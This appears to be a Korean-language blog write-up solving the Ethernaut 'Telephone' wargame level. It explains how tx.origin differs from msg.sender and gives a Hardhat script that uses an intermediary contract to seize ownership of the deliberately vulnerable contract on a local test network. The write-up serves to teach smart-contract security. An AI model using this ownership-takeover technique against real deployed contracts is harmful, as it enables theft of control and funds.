+++
title = "Telephone"
date = "2023-08-21"
+++

---

> My Solutions: [github](https://github.com/c0np4nn4/EtherStudy/tree/main/ethernaut_solution)

---

# TL;DR
> `tx.origin` 과 `msg.sender`의 차이를 묻는 문제입니다. 

<center>
<img alt="main image" src="https://images.unsplash.com/photo-1614688395919-31228976e03c?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=689&q=80" />
</center>

---

# Introduction
스마트 컨트랙트를 작성할 때 많은 부분들은 직관적으로 이해할 수 있는 수준이며, 예상대로 동작하게 됩니다.
하지만, 잘못 이해하고 사용하면 바로 취약점으로 연결되는 요소들도 존재합니다.
이번 문제인 `Telephone` 컨트랙트는 그러한 요소들 중 하나인 `msg.sender`와 `tx.origin`의 차이를 다룹니다.

---

# Problem Detail
## Goal
우선 문제 목표를 확인하기 위해 `TelephoneFactory` 컨트랙트의 `validateInstance()` 함수를 살펴보면 아래와 같습니다.

<center>
<img alt="validateInstance" src="../../ethernaut_img/4_telephone_1.png" />
</center>

`owner`를 변경하면 됨을 확인할 수 있습니다.

## Contract
스마트 컨트랙트를 살펴보면 아래와 같습니다.

<center>
<img alt="telephone.sol" src="../../ethernaut_img/4_telephone_2.png" />
</center>

컨트랙트를 배포할 때, `owner`는 `msg.sender`가 됩니다.
함수 `changeOwner()`는 인자로 `_owner`를 받고, 만약 `tx.origin != msg.sender`라면 인자로 받은 값을 새로운 `owner`로 바꿉니다.


---

# Exploit
본격적으로 `exploit`을 진행하기 전에 `tx.origin`과 `msg.sender`에 관한 내용을 정리하고 넘어가도록 하겠습니다.

## `tx.origin`, `msg.sender`
얼핏 보면, 트랜잭션을 보내는 주체와 "메세지"를 보내는 주체를 나눈 이유가 없어 보입니다.
하지만, [Solidity Docs](https://docs.soliditylang.org/en/v0.8.17/units-and-global-variables.html#block-and-transaction-properties)에 따르면, 아래와 같이 그 차이를 정리할 수 있습니다.

> - `tx.origin`
>     - **Full Call Chain**에서 처음으로 트랜잭션을 보낸 주체
> - `msg.sender`
>     - **Current Call** 에 대한 메세지를 보낸 주체

보다 직관적인 이해를 위해 다이어그램과 함께 설명을 첨가하겠습니다.

(추가)

## Strategy
따라서, `Telephone` 컨트랙트를 호출하는 `TelephoneCaller`라는 이름의 컨트랙트를 하나 더 배포하여 `tx.origin != msg.sender`가 되도록 **Call Chain** 을 만들어주면 됩니다.

## Code
아래는 `Hardhat`을 이용하여 실행한 `telephone.js` 입니다.
코드 실행 환경은 [레포](https://github.com/c0np4nn4/etherstudy)를 확인해주시기 바랍니다.

```js
const { ethers } = require('hardhat');

async function main() {
  const [owner, player] = await ethers.getSigners();
  console.log("\n[0] original owner: ", owner.address);
  console.log("[0] player: ", player.address);

  console.log("\n[1] deploy TelephonFactory");
  const Factory = await ethers.getContractFactory("TelephoneFactory");
  const factory = await Factory.deploy();
  await factory.deployed();
  console.log("---- TelephoneFactory address: ", factory.address);

  console.log("\n[2] create a Telephon instance");
  const receipt = await factory.createInstance(player.address);
  const instance_address = (await receipt.wait()).events[0].args[0];
  const telephone = await ethers.getContractAt("Telephone", instance_address, owner);

  console.log("\n[3] deploy Caller");
  const Caller = await ethers.getContractFactory("TelephoneCaller");
  const caller = await Caller.connect(player).deploy();
  await caller.deployed();
  console.log("---- TelephoneCaller address: ", caller.address);

  console.log("\n[4] call attack()");
  await caller.connect(player).attack(telephone.address, player.address);

  console.log("\n[5] validate solved");
  const res = await factory.validateInstance(telephone.address, player.address);
  if (res == true) {
    console.log("[+] Done!");
  } else {
    console.log("[+] Fail...");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```
## Result
실행 화면은 아래와 같습니다.

<center>
<img alt="result" src="../../ethernaut_img/4_telephone_3.png" />
</center>

앞서 살펴본대로, `TelephoneCaller`를 호출할 때는 `tx.origin`과 `msg.sender`의 값이 동일합니다.
하지만, *Call Chain* 이 생기면서 `Telephone`을 호출할 때는 `tx.origin`은 **그대로**있고, `msg.sender`만 `TelephoneCaller`의 주소로 변경됨을 확인할 수 있습니다.



---

# Conclusion
여러 스마트 컨트랙트를 연결하여 **Call Chain**을 구성하는 패턴은 자주 쓰일 것으로 보입니다.
이 때, `tx.origin`과 `msg.sender`의 개념을 정확히 이해하고 있어야 여러 logical error 의 발생을 막고 안전한 스마트 컨트랙트를 작성할 수 있습니다.
`Transaction` 은 서명이 필요하고 서명을 위해서는 `비밀키`를 갖고 있어야 한다는 점을 상기하면, `tx.origin`은 `EOA`의 정보를 계속 가지고 가고 `msg.sender`는 함수 호출 과정에서 필요한 직전 계정의 정보를 담고 있다고 이해할 수 있습니다.

<script src="https://utteranc.es/client.js"
        repo="c0np4nn4/utterance_repo"
        issue-term="pathname"
        label="utterances"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>

